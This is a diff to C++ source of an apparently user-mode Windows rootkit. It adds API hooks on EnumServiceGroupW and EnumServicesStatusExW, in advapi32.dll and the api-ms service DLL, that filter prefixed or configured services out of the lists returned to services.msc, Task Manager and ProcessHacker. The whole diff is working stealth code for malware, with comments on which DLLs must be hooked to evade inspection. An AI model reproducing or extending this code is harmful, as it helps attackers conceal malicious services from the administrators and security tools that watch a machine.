@@ -8,6 +8,9 @@ nt::NTQUERYDIRECTORYFILE Hooks::OriginalNtQueryDirectoryFile = NULL;
 nt::NTQUERYDIRECTORYFILEEX Hooks::OriginalNtQueryDirectoryFileEx = NULL;
 nt::NTENUMERATEKEY Hooks::OriginalNtEnumerateKey = NULL;
 nt::NTENUMERATEVALUEKEY Hooks::OriginalNtEnumerateValueKey = NULL;
+nt::ENUMSERVICEGROUPW Hooks::OriginalEnumServiceGroupW = NULL;
+nt::ENUMSERVICESSTATUSEXW Hooks::OriginalEnumServicesStatusExW = NULL;
+nt::ENUMSERVICESSTATUSEXW Hooks::OriginalEnumServicesStatusExWApi = NULL;
 nt::NTDEVICEIOCONTROLFILE Hooks::OriginalNtDeviceIoControlFile = NULL;
 
 void Hooks::Initialize()
@@ -25,8 +28,17 @@ void Hooks::Initialize()
 		InstallHook("ntdll.dll", "NtQueryDirectoryFileEx", (LPVOID*)&OriginalNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
 		InstallHook("ntdll.dll", "NtEnumerateKey", (LPVOID*)&OriginalNtEnumerateKey, HookedNtEnumerateKey);
 		InstallHook("ntdll.dll", "NtEnumerateValueKey", (LPVOID*)&OriginalNtEnumerateValueKey, HookedNtEnumerateValueKey);
+		InstallHook("advapi32.dll", "EnumServiceGroupW", (LPVOID*)&OriginalEnumServiceGroupW, HookedEnumServiceGroupW);
+		InstallHook("advapi32.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExW, HookedEnumServicesStatusExW);
+		InstallHook("api-ms-win-service-core-l1-1-1.dll", "EnumServicesStatusExW", (LPVOID*)&OriginalEnumServicesStatusExWApi, HookedEnumServicesStatusExWApi);
 		InstallHook("ntdll.dll", "NtDeviceIoControlFile", (LPVOID*)&OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
 		DetourTransactionCommit();
+
+		// Usually, ntdll.dll should be the only DLL to hook.
+		// Unfortunately, the actual enumeration of services happens in services.exe - a protected process that cannot be injected.
+		// EnumServiceGroupW and EnumServicesStatusExW from advapi32.dll access services.exe through RPC. There is no longer one single syscall wrapper function to hook, but multiple higher level functions.
+		// Furthermore, the api-ms-*.dll files are a set of DLL's introduced in Windows 7 that also need to be hooked in this case.
+		// EnumServicesStatusA and EnumServicesStatusExA also implement the RPC, but do not seem to be used by any applications out there.
 	}
 }
 void Hooks::Shutdown()
@@ -43,6 +55,9 @@ void Hooks::Shutdown()
 		UninstallHook(OriginalNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
 		UninstallHook(OriginalNtEnumerateKey, HookedNtEnumerateKey);
 		UninstallHook(OriginalNtEnumerateValueKey, HookedNtEnumerateValueKey);
+		UninstallHook(OriginalEnumServiceGroupW, HookedEnumServiceGroupW);
+		UninstallHook(OriginalEnumServicesStatusExW, HookedEnumServicesStatusExW);
+		UninstallHook(OriginalEnumServicesStatusExWApi, HookedEnumServicesStatusExWApi);
 		UninstallHook(OriginalNtDeviceIoControlFile, HookedNtDeviceIoControlFile);
 		DetourTransactionCommit();
 	}
@@ -327,6 +342,42 @@ NTSTATUS NTAPI Hooks::HookedNtEnumerateValueKey(HANDLE key, ULONG index, nt::KEY
 
 	return status;
 }
+BOOL WINAPI Hooks::HookedEnumServiceGroupW(SC_HANDLE serviceManager, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPVOID reserved)
+{
+	// services.msc
+	BOOL result = OriginalEnumServiceGroupW(serviceManager, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, reserved);
+
+	if (result && services && servicesReturned)
+	{
+		ProcessEnumServices(ServiceStructType::ENUM_SERVICE_STATUSW, services, servicesReturned);
+	}
+
+	return result;
+}
+BOOL WINAPI Hooks::HookedEnumServicesStatusExW(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCWSTR groupName)
+{
+	// TaskMgr (Windows 7), ProcessHacker
+	BOOL result = OriginalEnumServicesStatusExW(serviceManager, infoLevel, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, groupName);
+
+	if (result && services && servicesReturned)
+	{
+		ProcessEnumServices(ServiceStructType::ENUM_SERVICE_STATUS_PROCESSW, services, servicesReturned);
+	}
+
+	return result;
+}
+BOOL WINAPI Hooks::HookedEnumServicesStatusExWApi(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCWSTR groupName)
+{
+	// TaskMgr (Windows 10 uses api-ms-win-service-core-l1-1-1.dll instead of advapi32.dll)
+	BOOL result = OriginalEnumServicesStatusExWApi(serviceManager, infoLevel, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, groupName);
+
+	if (result && services && servicesReturned)
+	{
+		ProcessEnumServices(ServiceStructType::ENUM_SERVICE_STATUS_PROCESSW, services, servicesReturned);
+	}
+
+	return result;
+}
 NTSTATUS NTAPI Hooks::HookedNtDeviceIoControlFile(HANDLE fileHandle, HANDLE event, PIO_APC_ROUTINE apcRoutine, LPVOID apcContext, PIO_STATUS_BLOCK ioStatusBlock, ULONG ioControlCode, LPVOID inputBuffer, ULONG inputBufferLength, LPVOID outputBuffer, ULONG outputBufferLength)
 {
 	NTSTATUS status = OriginalNtDeviceIoControlFile(fileHandle, event, apcRoutine, apcContext, ioStatusBlock, ioControlCode, inputBuffer, inputBufferLength, outputBuffer, outputBufferLength);
@@ -569,5 +620,44 @@ PWCHAR Hooks::KeyValueInformationGetName(LPVOID keyValueInformation, nt::KEY_VAL
 			return ((nt::PKEY_VALUE_FULL_INFORMATION)keyValueInformation)->Name;
 		default:
 			return NULL;
+	}
+}
+void Hooks::ProcessEnumServices(ServiceStructType type, LPBYTE services, LPDWORD servicesReturned)
+{
+	if (type == ServiceStructType::ENUM_SERVICE_STATUSW)
+	{
+		LPENUM_SERVICE_STATUSW serviceList = (LPENUM_SERVICE_STATUSW)services;
+
+		for (DWORD i = 0; i < *servicesReturned; i++)
+		{
+			// If hidden, move all following entries up by one and decrease count.
+			if (Rootkit::HasPrefix(serviceList[i].lpServiceName) ||
+				Rootkit::HasPrefix(serviceList[i].lpDisplayName) ||
+				Config::IsServiceNameHidden(serviceList[i].lpServiceName) ||
+				Config::IsServiceNameHidden(serviceList[i].lpDisplayName))
+			{
+				RtlMoveMemory(&serviceList[i], &serviceList[i + 1], (*servicesReturned - i - 1) * sizeof(ENUM_SERVICE_STATUSW));
+				(*servicesReturned)--;
+				i--;
+			}
+		}
+	}
+	else if (type == ServiceStructType::ENUM_SERVICE_STATUS_PROCESSW)
+	{
+		LPENUM_SERVICE_STATUS_PROCESSW serviceList = (LPENUM_SERVICE_STATUS_PROCESSW)services;
+
+		for (DWORD i = 0; i < *servicesReturned; i++)
+		{
+			// If hidden, move all following entries up by one and decrease count.
+			if (Rootkit::HasPrefix(serviceList[i].lpServiceName) ||
+				Rootkit::HasPrefix(serviceList[i].lpDisplayName) ||
+				Config::IsServiceNameHidden(serviceList[i].lpServiceName) ||
+				Config::IsServiceNameHidden(serviceList[i].lpDisplayName))
+			{
+				RtlMoveMemory(&serviceList[i], &serviceList[i + 1], (*servicesReturned - i - 1) * sizeof(ENUM_SERVICE_STATUS_PROCESSW));
+				(*servicesReturned)--;
+				i--;
+			}
+		}
 	}
 }
